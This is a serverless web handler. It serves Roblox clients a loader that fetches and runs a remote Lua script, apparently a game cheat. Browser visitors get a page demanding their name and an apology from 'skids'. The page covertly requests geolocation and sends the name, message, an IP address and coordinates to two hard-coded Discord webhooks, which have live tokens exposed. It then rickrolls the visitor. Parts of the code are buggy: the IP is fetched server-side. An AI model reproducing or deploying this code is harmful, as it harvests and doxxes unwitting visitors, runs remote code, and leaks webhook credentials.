export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const ipifyUrl = 'https://api.ipify.org?format=json'; // API to get the user's IP address

  if (userAgent.includes('Roblox') || userAgent === '') {
    // Roblox client loading
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(`
print("Script loaded!")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
    `);
  } else if (req.method === 'POST') {
    // Skid submitted a message
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      const data = JSON.parse(body);
      let name = data.name || 'Unknown';
      let message = data.message || 'No message';

      // Prevent @everyone and @here pings
      name = name.replace(/@/g, '@\u200b');
      message = message.replace(/@/g, '@\u200b');

      // Get IP address using ipify API
      let ipAddress = 'Unknown IP';
      try {
        const ipResponse = await fetch(ipifyUrl);
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip || 'Unknown IP';
      } catch (error) {
        console.error('Error fetching IP:', error);
      }

      // Get Geolocation (optional)
      let location = { latitude: 'Not available', longitude: 'Not available' };
      if (req.body.geoLocation) {
        location.latitude = req.body.geoLocation.latitude;
        location.longitude = req.body.geoLocation.longitude;
      }

      // Send name and message to the first webhook (skid info)
      const skidWebhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
      await fetch(skidWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}`
        })
      });

      // Send IP address and name to the second webhook (IP info)
      const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
      await fetch(ipWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**IP Address Detected**\n**IP Address:** ${ipAddress}\n**Real Name:** ${name}\n**Geolocation:** Latitude: ${location.latitude}, Longitude: ${location.longitude}`
        })
      });

      res.status(200).json({ success: true });
    });
  } else {
    // Browser showing the form
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>WHAT ARE YOU DOING</title>
        <style>
          body {
            background-color: black;
            color: white;
            font-family: monospace;
            text-align: center;
            margin-top: 100px;
          }
          input, textarea, button {
            padding: 10px;
            margin: 10px;
            font-size: 16px;
            width: 300px;
          }
        </style>
      </head>
      <body>
        <h1>WHAT ARE YOU DOING</h1>
        <p>Type your name and apology:</p>
        <input type="text" id="nameBox" placeholder="Your Name"><br>
        <textarea id="messageBox" rows="4" placeholder="I'm sorry..."></textarea><br>
        <button onclick="sendMessage()">Send</button>

        <script>
          function sendMessage() {
            const name = document.getElementById('nameBox').value;
            const message = document.getElementById('messageBox').value;

            if (!name || !message) {
              alert('Please fill all fields!');
              return;
            }

            // Geolocation request
            let geoLocation = { latitude: 'Not available', longitude: 'Not available' };
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(function(position) {
                geoLocation.latitude = position.coords.latitude;
                geoLocation.longitude = position.coords.longitude;
              });
            }

            fetch(window.location.pathname, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                name: name,
                message: message,
                geoLocation: geoLocation
              })
            }).then(() => {
              // After successful send, redirect to rickroll
              window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }).catch((err) => {
              alert('Failed to send.');
            });
          }
        </script>
      </body>
      </html>
    `);
  }
}
